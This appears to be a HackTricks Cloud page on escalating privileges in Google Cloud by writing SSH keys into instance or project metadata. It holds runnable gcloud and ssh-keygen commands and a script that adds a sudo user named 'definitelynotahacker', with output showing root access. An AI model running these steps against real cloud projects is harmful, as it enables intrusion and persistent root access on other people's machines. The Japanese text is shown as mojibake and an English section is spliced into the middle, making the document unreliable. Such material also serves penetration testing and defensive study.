# GCP - ã‚«ã‚¹ã‚¿ãƒ SSHãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®è¿½åŠ 

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã— **HackTricks ã§ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¾ã—ã‚‡ã†ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã®å¤‰æ›´ <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

ã‚‚ã—ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´ã§ãã‚‹å ´åˆã€ç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ãŸã‚ã®æ•°å¤šãã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®æ¨©é™ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã¤ãªãŒã‚‹ã„ãã¤ã‹ã®ã‚·ãƒŠãƒªã‚ªãŒã‚ã‚Šã¾ã™:

_**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**_\
ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ã‚¢ã‚¯ã‚»ã‚¹ **ã‚¹ã‚³ãƒ¼ãƒ—** ãŒ **ãƒ•ãƒ«ã‚¢ã‚¯ã‚»ã‚¹** ã«è¨­å®šã•ã‚Œã¦ã„ã‚‹ã‹ã€å°‘ãªãã¨ã‚‚ **ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ãƒˆAPIã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ãŒæ˜ç¤ºçš„ã«è¨±å¯ã•ã‚Œã¦ã„ã‚‹** å ´åˆã€ã“ã®è¨­å®šã¯ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã® **è„†å¼±æ€§** ãŒã‚ã‚Šã¾ã™ã€‚**ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ã‚¹ã‚³ãƒ¼ãƒ—** ã¯ **è„†å¼±æ€§ãŒãªã„** ã§ã™ã€‚

_**ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**_\
ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹å ´åˆã€ä»¥ä¸‹ã®ã„ãšã‚Œã‹ã®IAMæ¨©é™ãŒç‰¹æ¨©ã‚’ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã™ã‚‹ãŸã‚ã« **å¿…è¦** ã§ã™:

* `compute.instances.setMetadata` (å˜ä¸€ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚)
* `compute.projects.setCommonInstanceMetadata` (ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ã™ã¹ã¦ã®ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ãŸã‚)

Googleã¯[æ¨å¥¨ã—ã¦ã„ã¾ã™](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)ãŒã€ã‚«ã‚¹ã‚¿ãƒ ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã‚¹ã‚³ãƒ¼ãƒ—ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚ä»¥ä¸‹ã®ã„ãšã‚Œã‹ã® **ã‚¢ã‚¯ã‚»ã‚¹ã‚¹ã‚³ãƒ¼ãƒ—** ãŒå¿…è¦ã§ã™:

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **ã‚«ã‚¹ã‚¿ãƒ ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã«SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

GCPä¸Šã® **Linuxã‚·ã‚¹ãƒ†ãƒ ** ã§ã¯ã€é€šå¸¸ã€[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã¾ã™ã€‚ãã®ä¸­ã®1ã¤ãŒ [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) ã§ã€**å®šæœŸçš„ã«** ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ **ã‚¯ã‚¨ãƒª** ã—ã¦ã€**èªè¨¼æ¸ˆã¿SSHå…¬é–‹éµã®å¤‰æ›´** ã‚’ç¢ºèªã—ã¾ã™ã€‚

**æ–°ã—ã„å…¬é–‹éµãŒè¦‹ã¤ã‹ã£ãŸå ´åˆã€ãã‚Œã¯å‡¦ç†ã•ã‚Œã€ãƒ­ãƒ¼ã‚«ãƒ«ãƒã‚·ãƒ³ã«è¿½åŠ ã•ã‚Œã¾ã™**ã€‚éµã®å½¢å¼ã«ã‚ˆã£ã¦ã¯ã€**æ—¢å­˜ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã® `~/.ssh/authorized_keys` ãƒ•ã‚¡ã‚¤ãƒ«ã«è¿½åŠ ã•ã‚Œã‚‹ã‹ã€`sudo` æ¨©é™ã‚’æŒã¤æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½œæˆã•ã‚Œã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã§ **ã‚«ã‚¹ã‚¿ãƒ ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´** ã§ãã‚‹å ´åˆã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã¸ã®SSHæ¨©é™ã‚’å–å¾—ã™ã‚‹ã“ã¨ã§ã€ãƒ­ãƒ¼ã‚«ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã§ **rootæ¨©é™ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€**ã‚«ã‚¹ã‚¿ãƒ ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’å¤‰æ›´** ã§ãã‚‹å ´åˆã€ã‚¢ã‚«ã‚¦ãƒ³ãƒˆãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ **ç¾åœ¨ã®GCPãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå†…ã®ä»»æ„ã®ã‚·ã‚¹ãƒ†ãƒ ** ã§ **rootæ¨©é™ã«ã‚¨ã‚¹ã‚«ãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **æ—¢å­˜ã®ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

æœ€åˆã«æ—¢å­˜ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è‡ªåˆ†ã®ã‚­ãƒ¼ã‚’è¿½åŠ ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æœ€ã‚‚é¨’éŸ³ã®å°‘ãªã„æ–¹æ³•ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚

**æ—¢å­˜ã®SSHã‚­ãƒ¼ã‚’æŒã¤ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã§ç¢ºèª**ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã‚‰ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ã†ã¡ã®1äººã‚’é¸æŠã—ã€ãŠãã‚‰ãsudoæ¨©é™ã‚’æŒã£ã¦ã„ã‚‹ã§ã—ã‚‡ã†ã€‚
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
## Add Custom SSH Metadata

To escalate privileges in Google Cloud Platform (GCP), you can add custom SSH metadata to a GCP instance. This allows you to gain SSH access to the instance with elevated privileges.

To add custom SSH metadata, follow these steps:

1. Open the GCP Console and navigate to the Compute Engine page.
2. Select the instance to which you want to add custom SSH metadata.
3. Click on the "Edit" button at the top of the page.
4. Scroll down to the "Custom metadata" section.
5. Click on the "Add item" button.
6. In the "Key" field, enter `ssh-keys`.
7. In the "Value" field, enter the SSH public key that you want to use for authentication.
8. Click on the "Save" button to save the changes.

Once the custom SSH metadata is added, you can SSH into the GCP instance using the specified SSH public key. This will grant you elevated privileges on the instance.

It is important to note that adding custom SSH metadata requires the necessary permissions in GCP. Make sure you have the appropriate permissions before attempting this privilege escalation technique.
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
å…¬é–‹éµã®å½¢å¼ãŒ**å°‘ã—å¤‰ã‚ã£ã¦ã„ã‚‹**ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ - ãƒ¦ãƒ¼ã‚¶ãƒ¼åãŒ**å…ˆé ­**ã«ãƒªã‚¹ãƒˆã•ã‚Œï¼ˆã‚³ãƒ­ãƒ³ã«ç¶šã„ã¦ï¼‰ã€å†ã³**æœ«å°¾**ã«ãƒªã‚¹ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®å½¢å¼ã«åˆã‚ã›ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚é€šå¸¸ã®SSHéµã®æ“ä½œã¨ã¯ç•°ãªã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¯é‡è¦ã§ã™ï¼

ãƒ¦ãƒ¼ã‚¶ãƒ¼åã¨éµã®è¡Œã‚’æ–°ã—ã„ãƒ†ã‚­ã‚¹ãƒˆãƒ•ã‚¡ã‚¤ãƒ«`meta.txt`ã«**ä¿å­˜**ã—ã¾ã™ã€‚

ä¸Šè¨˜ã®ä¾‹ã§ãƒ¦ãƒ¼ã‚¶ãƒ¼`alice`ã‚’ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ã—ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã—ã‚‡ã†ã€‚æ¬¡ã®ã‚ˆã†ã«ã€è‡ªåˆ†è‡ªèº«ã®ãŸã‚ã«**æ–°ã—ã„éµã‚’ç”Ÿæˆ**ã—ã¾ã™ï¼š
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
æ–°ã—ã„å…¬é–‹éµã‚’`meta.txt`ãƒ•ã‚¡ã‚¤ãƒ«ã«è¿½åŠ ã—ã€ä»¥ä¸‹ã®å½¢å¼ã‚’æ¨¡å€£ã—ã¦ãã ã•ã„ï¼š
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®SSHã‚­ãƒ¼ãƒ¡ã‚¿ãƒ‡ãƒ¼ã‚¿ã‚’**å†æ›¸ãè¾¼ã¿**ã§ãã¾ã™ã€‚
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
æ¬¡ã®ã‚ˆã†ã«ã—ã¦ã€`alice`ã®ã‚³ãƒ³ãƒ†ã‚­ã‚¹ãƒˆã§ã‚·ã‚§ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã¾ã™ï¼š

```bash
ssh alice@<instance-ip>
```

Replace `<instance-ip>` with the IP address of the instance you want to access.
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **ç‰¹æ¨©ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã—ã€SSHã‚­ãƒ¼ã‚’è¿½åŠ ã™ã‚‹**

ä¸Šè¨˜ã®æ‰‹é †ã«å¾“ã£ã¦ã‚‚æ—¢å­˜ã®ã‚­ãƒ¼ãŒè¦‹ã¤ã‹ã‚‰ãªã„å ´åˆã€`/etc/passwd`ã«èˆˆå‘³æ·±ã„ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã„ã¾ã›ã‚“ã‹ï¼Ÿ

ä¸Šè¨˜ã¨åŒã˜æ‰‹é †ã«å¾“ã„ã€ãŸã æ–°ã—ã„ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½œæˆã™ã‚‹ã ã‘ã§**åŒã˜ãƒ—ãƒ­ã‚»ã‚¹ã‚’å®Ÿè¡Œ**ã§ãã¾ã™ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯è‡ªå‹•çš„ã«ä½œæˆã•ã‚Œã€`sudo`ã®æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€ãƒ—ãƒ­ã‚»ã‚¹ã¯æ¬¡ã®ã‚ˆã†ã«ãªã‚Šã¾ã™ï¼š
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã®SSHã‚­ãƒ¼ <a href="#sshing-around" id="sshing-around"></a>

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§èª¬æ˜ã—ãŸè©³ç´°ã«å¾“ã£ã¦ã€ã•ã‚‰ã«VMã‚’ä¾µå®³ã—ã‚ˆã†ã¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

[**ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆãƒ¬ãƒ™ãƒ«ã§SSHã‚­ãƒ¼ã‚’é©ç”¨ã™ã‚‹**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)ã“ã¨ã«ã‚ˆã‚Šã€æ˜ç¤ºçš„ã«ã€Œãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆå…¨ä½“ã®SSHã‚­ãƒ¼ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã€ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’é¸æŠã—ã¦ã„ãªã„å ´åˆã€ç‰¹æ¨©ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«SSHã§ãã‚‹æ¨©é™ãŒä¸ãˆã‚‰ã‚Œã¾ã™ã€‚
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
ã‚‚ã—æœ¬å½“ã«å¤§èƒ†ãªã‚‰ã€å˜ã« `gcloud compute ssh [INSTANCE]` ã¨å…¥åŠ›ã™ã‚‹ã ã‘ã§ã€ä»–ã®ãƒœãƒƒã‚¯ã‚¹ã§ç¾åœ¨ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼åã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* ã‚‚ã— **HackTricks ã§ã‚ãªãŸã®ä¼šç¤¾ã‚’å®£ä¼ã—ãŸã„** ã¾ãŸã¯ **PEASS ã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã„** ã¾ãŸã¯ **HackTricks ã‚’ PDF ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„** å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼ã® PEASS & HackTricks ã‚¹ãƒ¯ãƒƒã‚°**](https://peass.creator-spring.com) ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) ã‚’è¦‹ã¤ã‘ã¦ã€ç‹¬å çš„ãª [**NFTs**](https://opensea.io/collection/the-peass-family) ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†
* ğŸ’¬ [**Discord ã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f) ã¾ãŸã¯ [**telegram ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass) ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm) ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PR ã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã® GitHub ãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
